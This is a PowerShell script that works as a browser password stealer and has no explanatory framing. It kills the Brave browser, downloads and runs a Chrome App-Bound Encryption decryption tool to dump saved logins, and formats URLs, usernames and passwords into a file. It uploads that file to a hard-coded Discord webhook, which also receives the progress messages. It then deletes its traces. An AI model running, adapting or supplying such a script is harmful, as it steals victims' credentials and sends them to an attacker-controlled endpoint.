$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

function Send {
    param([string]$m)
    Invoke-RestMethod -Uri $wh -Method Post -Body (@{content=$m}|ConvertTo-Json) -ContentType "application/json"|Out-Null
}

Send "🚀 ChromeElevator bypass starting..."

Get-Process brave -EA 0|Stop-Process -Force -EA 0
Start-Sleep 5

cd $env:TEMP

[Net.ServicePointManager]::SecurityProtocol='Tls12'
Invoke-WebRequest "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v1.0.0/chromelevator.exe" -OutFile "ce.exe" -UseBasicParsing

if (Test-Path "ce.exe") {
    Send "✅ Downloaded, running..."
    
    $out = .\ce.exe brave --output pass.json 2>&1|Out-String
    Start-Sleep 5
    
    Send "Output: $out"
    
    if (Test-Path "pass.json") {
        $j = Get-Content "pass.json" -Raw|ConvertFrom-Json
        
        if ($j.passwords) {
            $r = ""
            foreach ($p in $j.passwords) {
                $r += "$($p.url)`n$($p.username)`n$($p.password)`n`n"
            }
            $r|Out-File "r.txt" -Encoding UTF8
            curl.exe -F "file=@r.txt" $wh
            Remove-Item r.txt
        } else {
            Send "JSON vide"
        }
        Remove-Item pass.json
    } else {
        Send "Pas de JSON créé"
    }
    
    Remove-Item ce.exe
} else {
    Send "❌ Téléchargement échoué"
}

Send "🏁 Fini"
